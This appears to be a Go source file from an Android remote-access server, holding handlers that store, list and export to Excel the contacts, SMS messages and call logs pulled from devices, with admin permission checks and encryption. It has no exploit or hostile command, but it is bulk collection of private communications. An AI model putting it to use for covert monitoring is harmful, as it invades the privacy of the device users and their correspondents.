package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/enterprise/android-remote-access/server/internal/models"
	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"github.com/xuri/excelize/v2"
)

func (s *Server) handleSaveDeviceComms(w http.ResponseWriter, r *http.Request) {
	admin := getAdmin(r.Context())
	if !s.permissionChecker.HasPermission(admin, "device:command") &&
		!s.permissionChecker.HasPermission(admin, "contacts:read") {
		s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Insufficient permissions")
		return
	}
	if s.db == nil {
		s.writeError(w, http.StatusServiceUnavailable, "DB_UNAVAILABLE", "Database is not available")
		return
	}

	deviceID, err := uuid.Parse(mux.Vars(r)["id"])
	if err != nil {
		s.writeError(w, http.StatusBadRequest, "INVALID_ID", "Invalid device ID")
		return
	}

	var req models.CommsSaveRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, http.StatusBadRequest, "INVALID_REQUEST", "Invalid request body")
		return
	}

	result := models.CommsSaveResult{}
	if len(req.Contacts) > 0 {
		if !s.permissionChecker.HasPermission(admin, "contacts:read") &&
			!s.permissionChecker.HasPermission(admin, "contacts:*") &&
			!s.permissionChecker.HasPermission(admin, "device:command") {
			s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Missing contacts permission")
			return
		}
		if err := s.sealContactMaps(deviceID, req.Contacts); err != nil {
			s.writeError(w, http.StatusInternalServerError, "ENCRYPT_ERROR", err.Error())
			return
		}
		n, err := s.db.UpsertDeviceContacts(r.Context(), deviceID, req.Contacts)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to save contacts: "+err.Error())
			return
		}
		result.ContactsSaved = n
	}
	if len(req.Messages) > 0 {
		if !s.permissionChecker.HasPermission(admin, "sms:read") &&
			!s.permissionChecker.HasPermission(admin, "sms:*") &&
			!s.permissionChecker.HasPermission(admin, "device:command") {
			s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Missing SMS permission")
			return
		}
		if err := s.sealSMSMaps(deviceID, req.Messages); err != nil {
			s.writeError(w, http.StatusInternalServerError, "ENCRYPT_ERROR", err.Error())
			return
		}
		n, err := s.db.UpsertDeviceSMS(r.Context(), deviceID, req.Messages)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to save messages: "+err.Error())
			return
		}
		result.MessagesSaved = n
	}
	if len(req.Calls) > 0 {
		if !s.permissionChecker.HasPermission(admin, "calls:read") &&
			!s.permissionChecker.HasPermission(admin, "calls:*") &&
			!s.permissionChecker.HasPermission(admin, "device:command") {
			s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Missing call-log permission")
			return
		}
		if err := s.sealCallMaps(deviceID, req.Calls); err != nil {
			s.writeError(w, http.StatusInternalServerError, "ENCRYPT_ERROR", err.Error())
			return
		}
		n, err := s.db.UpsertDeviceCallLogs(r.Context(), deviceID, req.Calls)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to save call logs: "+err.Error())
			return
		}
		result.CallsSaved = n
	}

	s.writeJSON(w, http.StatusOK, map[string]interface{}{
		"status": "ok",
		"saved":  result,
	})
}

func (s *Server) handleListDeviceComms(w http.ResponseWriter, r *http.Request) {
	admin := getAdmin(r.Context())
	if !s.permissionChecker.HasPermission(admin, "device:command") &&
		!s.permissionChecker.HasPermission(admin, "contacts:read") &&
		!s.permissionChecker.HasPermission(admin, "calls:read") &&
		!s.permissionChecker.HasPermission(admin, "sms:read") {
		s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Insufficient permissions")
		return
	}
	if s.db == nil {
		s.writeError(w, http.StatusServiceUnavailable, "DB_UNAVAILABLE", "Database is not available")
		return
	}

	deviceID, err := uuid.Parse(mux.Vars(r)["id"])
	if err != nil {
		s.writeError(w, http.StatusBadRequest, "INVALID_ID", "Invalid device ID")
		return
	}

	commType := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("type")))
	if commType == "" {
		commType = "all"
	}
	limit := 5000
	if v := r.URL.Query().Get("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			limit = n
		}
	}

	resp := map[string]interface{}{
		"device_id": deviceID.String(),
		"type":      commType,
	}

	switch commType {
	case "contacts":
		items, err := s.db.ListDeviceContacts(r.Context(), deviceID, limit)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to list contacts")
			return
		}
		s.openContacts(items)
		resp["contacts"] = items
		resp["count"] = len(items)
	case "sms", "messages":
		items, err := s.db.ListDeviceSMS(r.Context(), deviceID, limit)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to list messages")
			return
		}
		s.openSMS(items)
		resp["messages"] = items
		resp["count"] = len(items)
	case "calls", "call_logs":
		items, err := s.db.ListDeviceCallLogs(r.Context(), deviceID, limit)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to list call logs")
			return
		}
		s.openCalls(items)
		resp["calls"] = items
		resp["count"] = len(items)
	case "all":
		contacts, err := s.db.ListDeviceContacts(r.Context(), deviceID, limit)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to list contacts")
			return
		}
		messages, err := s.db.ListDeviceSMS(r.Context(), deviceID, limit)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to list messages")
			return
		}
		calls, err := s.db.ListDeviceCallLogs(r.Context(), deviceID, limit)
		if err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", "Failed to list call logs")
			return
		}
		s.openContacts(contacts)
		s.openSMS(messages)
		s.openCalls(calls)
		cCount, sCount, callCount, _ := s.db.CountDeviceComms(r.Context(), deviceID)
		resp["contacts"] = contacts
		resp["messages"] = messages
		resp["calls"] = calls
		resp["counts"] = map[string]int{
			"contacts": cCount,
			"messages": sCount,
			"calls":    callCount,
		}
	default:
		s.writeError(w, http.StatusBadRequest, "INVALID_TYPE", "type must be contacts, sms, calls, or all")
		return
	}

	s.writeJSON(w, http.StatusOK, resp)
}

func (s *Server) handleExportDeviceComms(w http.ResponseWriter, r *http.Request) {
	admin := getAdmin(r.Context())
	if !s.permissionChecker.HasPermission(admin, "device:command") &&
		!s.permissionChecker.HasPermission(admin, "contacts:read") &&
		!s.permissionChecker.HasPermission(admin, "calls:read") &&
		!s.permissionChecker.HasPermission(admin, "sms:read") {
		s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Insufficient permissions")
		return
	}
	if s.db == nil {
		s.writeError(w, http.StatusServiceUnavailable, "DB_UNAVAILABLE", "Database is not available")
		return
	}

	deviceID, err := uuid.Parse(mux.Vars(r)["id"])
	if err != nil {
		s.writeError(w, http.StatusBadRequest, "INVALID_ID", "Invalid device ID")
		return
	}

	commType := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("type")))
	if commType == "" {
		commType = "all"
	}

	f := excelize.NewFile()
	defer f.Close()

	defaultSheet := f.GetSheetName(0)
	wrote := 0

	writeContacts := func() error {
		items, err := s.db.ListDeviceContacts(r.Context(), deviceID, 50000)
		if err != nil {
			return err
		}
		sheet := "Contacts"
		if wrote == 0 {
			_ = f.SetSheetName(defaultSheet, sheet)
		} else {
			_, _ = f.NewSheet(sheet)
		}
		headers := []string{"DisplayName", "Number", "DataEntryDate"}
		for i, h := range headers {
			cell, _ := excelize.CoordinatesToCellName(i+1, 1)
			_ = f.SetCellValue(sheet, cell, h)
		}
		for i, c := range items {
			row := i + 2
			_ = f.SetCellValue(sheet, fmt.Sprintf("A%d", row), c.DisplayName)
			_ = f.SetCellValue(sheet, fmt.Sprintf("B%d", row), c.Number)
			_ = f.SetCellValue(sheet, fmt.Sprintf("C%d", row), c.DataEntryDate.Format("1/2/2006 3:04:05 PM"))
		}
		wrote++
		return nil
	}

	writeSMS := func() error {
		items, err := s.db.ListDeviceSMS(r.Context(), deviceID, 100000)
		if err != nil {
			return err
		}
		sheet := "Messages"
		if wrote == 0 {
			_ = f.SetSheetName(defaultSheet, sheet)
		} else {
			_, _ = f.NewSheet(sheet)
		}
		headers := []string{
			"Id", "isRead", "Address", "Message", "Name", "Person",
			"Date", "Message Type", "Data Entry Date",
		}
		for i, h := range headers {
			cell, _ := excelize.CoordinatesToCellName(i+1, 1)
			_ = f.SetCellValue(sheet, cell, h)
		}
		for i, m := range items {
			row := i + 2
			idVal := m.NativeID
			if idVal == "" {
				idVal = m.ID.String()
			}
			dateStr := ""
			if m.MessageDate != nil {
				dateStr = m.MessageDate.Format("1/2/2006 3:04:05 PM")
			}
			_ = f.SetCellValue(sheet, fmt.Sprintf("A%d", row), idVal)
			_ = f.SetCellValue(sheet, fmt.Sprintf("B%d", row), m.IsRead)
			_ = f.SetCellValue(sheet, fmt.Sprintf("C%d", row), m.Address)
			_ = f.SetCellValue(sheet, fmt.Sprintf("D%d", row), m.Message)
			_ = f.SetCellValue(sheet, fmt.Sprintf("E%d", row), m.Name)
			_ = f.SetCellValue(sheet, fmt.Sprintf("F%d", row), m.Person)
			_ = f.SetCellValue(sheet, fmt.Sprintf("G%d", row), dateStr)
			_ = f.SetCellValue(sheet, fmt.Sprintf("H%d", row), m.MessageType)
			_ = f.SetCellValue(sheet, fmt.Sprintf("I%d", row), m.DataEntryDate.Format("1/2/2006 3:04:05 PM"))
		}

		// Conversation summary sheet: Address + Last Message datetime
		convSheet := "Conversations"
		_, _ = f.NewSheet(convSheet)
		_ = f.SetCellValue(convSheet, "A1", "Address")
		_ = f.SetCellValue(convSheet, "B1", "Last Message")
		type convAgg struct {
			address string
			last    time.Time
			hasLast bool
		}
		byAddr := map[string]*convAgg{}
		var order []string
		for _, m := range items {
			addr := m.Address
			if addr == "" {
				continue
			}
			agg, ok := byAddr[addr]
			if !ok {
				agg = &convAgg{address: addr}
				byAddr[addr] = agg
				order = append(order, addr)
			}
			if m.MessageDate != nil {
				if !agg.hasLast || m.MessageDate.After(agg.last) {
					agg.last = *m.MessageDate
					agg.hasLast = true
				}
			}
		}
		row := 2
		for _, addr := range order {
			agg := byAddr[addr]
			_ = f.SetCellValue(convSheet, fmt.Sprintf("A%d", row), agg.address)
			if agg.hasLast {
				_ = f.SetCellValue(convSheet, fmt.Sprintf("B%d", row), agg.last.Format("1/2/2006 3:04:05 PM"))
			}
			row++
		}
		wrote++
		return nil
	}

	writeCalls := func() error {
		items, err := s.db.ListDeviceCallLogs(r.Context(), deviceID, 100000)
		if err != nil {
			return err
		}
		sheet := "CallLogs"
		if wrote == 0 {
			_ = f.SetSheetName(defaultSheet, sheet)
		} else {
			_, _ = f.NewSheet(sheet)
		}
		headers := []string{
			"CallID", "Number", "NameCall", "Duration", "TypeCall", "DateCall", "IDContacts", "DataEntryDate",
		}
		for i, h := range headers {
			cell, _ := excelize.CoordinatesToCellName(i+1, 1)
			_ = f.SetCellValue(sheet, cell, h)
		}
		for i, c := range items {
			row := i + 2
			dateStr := ""
			if c.DateCall != nil {
				dateStr = c.DateCall.Format("1/2/2006 3:04:05 PM")
			}
			_ = f.SetCellValue(sheet, fmt.Sprintf("A%d", row), c.CallID)
			_ = f.SetCellValue(sheet, fmt.Sprintf("B%d", row), c.Number)
			_ = f.SetCellValue(sheet, fmt.Sprintf("C%d", row), c.NameCall)
			_ = f.SetCellValue(sheet, fmt.Sprintf("D%d", row), c.Duration)
			_ = f.SetCellValue(sheet, fmt.Sprintf("E%d", row), c.TypeCall)
			_ = f.SetCellValue(sheet, fmt.Sprintf("F%d", row), dateStr)
			_ = f.SetCellValue(sheet, fmt.Sprintf("G%d", row), c.IDContacts)
			_ = f.SetCellValue(sheet, fmt.Sprintf("H%d", row), c.DataEntryDate.Format("1/2/2006 3:04:05 PM"))
		}
		wrote++
		return nil
	}

	switch commType {
	case "contacts":
		if err := writeContacts(); err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", err.Error())
			return
		}
	case "sms", "messages":
		if err := writeSMS(); err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", err.Error())
			return
		}
	case "calls", "call_logs":
		if err := writeCalls(); err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", err.Error())
			return
		}
	case "all":
		if err := writeContacts(); err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", err.Error())
			return
		}
		if err := writeSMS(); err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", err.Error())
			return
		}
		if err := writeCalls(); err != nil {
			s.writeError(w, http.StatusInternalServerError, "DB_ERROR", err.Error())
			return
		}
	default:
		s.writeError(w, http.StatusBadRequest, "INVALID_TYPE", "type must be contacts, sms, calls, or all")
		return
	}

	filename := fmt.Sprintf("device-%s-%s-%s.xlsx", deviceID.String()[:8], commType, time.Now().UTC().Format("20060102-150405"))
	w.Header().Set("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	if err := f.Write(w); err != nil {
		s.writeError(w, http.StatusInternalServerError, "EXPORT_ERROR", "Failed to write Excel file")
		return
	}
}
